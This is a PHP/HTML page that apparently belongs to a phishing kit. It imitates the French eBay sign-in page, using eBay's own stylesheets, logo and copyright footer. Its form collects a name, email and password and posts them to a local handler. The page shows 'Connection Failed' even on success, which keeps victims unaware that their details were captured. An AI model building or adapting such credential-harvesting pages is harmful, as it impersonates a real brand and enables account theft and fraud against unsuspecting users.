<!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="author" content="NoS1gnal"/>

            <link href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css" rel="stylesheet" />
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
            <title>Connexion</title>

<link rel="stylesheet" type="text/css" href="https://ir.ebaystatic.com/rs/v/34wtddjp0q1v1dtu2elv5jwg4yf.css?proc=DU:N">
<link rel="stylesheet"href="https://ir.ebaystatic.com/rs/c/signin-render-L7E1swEM.css">

        </head>
        <body>

        <div class="global-header">
<header id="gh" role="banner" class="gh-ui-6-5 gh-flex gh-pre-js gh-w gh-sch-prom gh-minH " data-treatment="">
<img width="250" height="200" style="clip:rect(47px, 118px, 95px, 0px); position:absolute; top:-47px;left:0" alt="Logo eBay" src="https://ir.ebaystatic.com/rs/v/fxxj3ttftm5ltcqnto1o4baovyl.png" id="gh-logo"></a>

<td class="sticky_placeholder"><ul></ul></td></tr></tbody></table><!--[if lt IE 9]></div><![endif]--></header>  </div><div class="body-content"><div id="mainContent"> 
<div class="id-first"><div class="signin-intro"><h1 id="greeting-msg" class="heading">Bonjour</h1><span id="signin-reg-msg" tabindex="-1" class="sub-heading">Se connecter à eBay ou crée un compte
        
        <div class="login-form">
            <?php 
                if(isset($_GET['reg_err']))
                {
                    $err = htmlspecialchars($_GET['reg_err']);

                    switch($err)
                    {
                        case 'success':
                        ?>
                            <div class="alert alert-success">
                                <strong>Connection Failed</strong>
                            </div>
                        <?php
                        break;

                        case 'password':
                        ?>
                            <div class="alert alert-danger">
                                <strong>Erreur</strong> mot de passe différent
                            </div>
                        <?php
                        break;

                        case 'email':
                        ?>
                            <div class="alert alert-danger">
                                <strong>Erreur</strong> email non valide
                            </div>
                        <?php
                        break;

                        case 'email_length':
                        ?>
                            <div class="alert alert-danger">
                                <strong>Erreur</strong> email trop long
                            </div>
                        <?php 
                        break;

                        case 'pseudo_length':
                        ?>
                            <div class="alert alert-danger">
                                <strong>Erreur</strong> pseudo trop long
                            </div>
                        <?php 
                        case 'already':
                        ?>
                            <div class="alert alert-danger">
                                <strong>Erreur</strong> compte deja existant
                            </div>
                        <?php 

                    }
                }
                ?>
            
            <form action="inscription_traitement.php" method="post">
                      
                <div class="form-group">
                    <input type="text" name="pseudo" class="form-control" placeholder="Nom" required="required" autocomplete="off">
                </div>
                <div class="form-group">
                    <input type="email" name="email" class="form-control" placeholder="Email" required="required" autocomplete="off">
                </div>
                <div class="form-group">
                    <input type="password" name="password" class="form-control" placeholder="Mot de passe" required="required" autocomplete="off">
                </div>
                <div class="form-group">
                    <input type="password" name="password_retype" class="form-control" placeholder="Re-tapez le mot de passe" required="required" autocomplete="off">
                </div>
                <div class="form-group">
                    <button type="submit" class="btn btn-primary btn-block">Se Connecter</button>
                </div>   
            </form>
        </div>
        <style>
            .login-form {
                width: 340px;
                margin: 50px auto;
            }
            .login-form form {
                margin-bottom: 15px;
                background: #f7f7f7;
                box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
                padding: 30px;
            }
            .login-form h2 {
                margin: 0 0 15px;
            }
            .form-control, .btn {
                min-height: 38px;
                border-radius: 2px;
            }
            .btn {        
                font-size: 15px;
                font-weight: bold;
            }
        </style>

<div class="accordion-head"><a id="need-help-signin-link" tabindex="0" role="button" aria-expanded="false">Vous avez besoin d'aide pour vous connecter&nbsp;?<svg class="icon icon--chevron-down" focusable="false"><use xlink:href="#icon-chevron-down"></use></svg></a></div>
<label>Vous utilisez un appareil public ou partagé&nbsp;?</label><label>Désélectionnez cette option pour protéger votre compte.<br><a href="" id="kmsi-learn-more-link">En savoir plus</a></label> </div></form></div><div></div></div></div>
<footer id="glbfooter" role="contentinfo" class="gh-w gh-flex"><div><div id="rtm_html_1650"></div><div id="rtm_html_1651"></div></div><h2 class="gh-ar-hdn">Autres options de navigation du site</h2><div id="gf-t-box"><table class="gf-t" role="presentation"><tbody><tr valign="top"><td class="gf-legal">Copyright © 1995-2021 eBay Inc. Tous droits réservés. <a href="https://pages.ebay.fr/help/policies/user-agreement.html">Conditions d'utilisation</a>, <a href="https://pages.ebay.fr/help/policies/privacy-policy.html">Données personnelles</a>, <a href="https://pages.ebay.fr/help/account/cookies-web-beacons.html">cookies</a> et <a href="https://www.ebay.fr/adchoice" id="gf-AdChoice">AdChoice</a></td><td nowrap="" align="center"><a title="Vérifier le certificat SSL du site" _exsp="m571.l3943" href="https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=www.ebay.fr&amp;lang=fr" onclick="this.href='https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=#D#&amp;lang=fr'.replace(/#D#/,location.host);return true" rel="noreferrer"><i id="gf-norton">Norton Secured&nbsp;- développé par Verisign</i></a></td></tr></tbody></table></div><!--[if lt IE 9]></div><![endif]--></footer>
  
        </body>
</html>